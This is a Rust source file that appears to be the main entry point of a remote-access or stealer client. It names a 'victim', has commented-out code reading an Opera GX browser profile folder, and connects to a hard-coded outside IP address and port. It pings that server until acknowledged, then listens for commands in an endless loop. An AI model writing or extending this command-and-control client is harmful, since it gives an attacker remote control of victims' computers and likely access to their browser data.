use client::RequestResult;

mod client;
mod dir_reader;

fn main() {

    //let mut reader = Reader::new("C://users/empty/AppData/Roaming/Opera Software/Opera GX Stable".to_string());
    //let res = reader.ls();
    //for i in res.unwrap(){
     //   println!("{}", i.unwrap().path().display().to_string())


    //}
    let victim_name = "zxc";

    let mut client = client::Client::new("http://91.203.192.8:9090");
    
    loop{
        let r = client.ping(victim_name);
        match r {
            RequestResult::Ok => break,
            _ => ()
        }
    }
    loop {
        client.listen()
    }
}
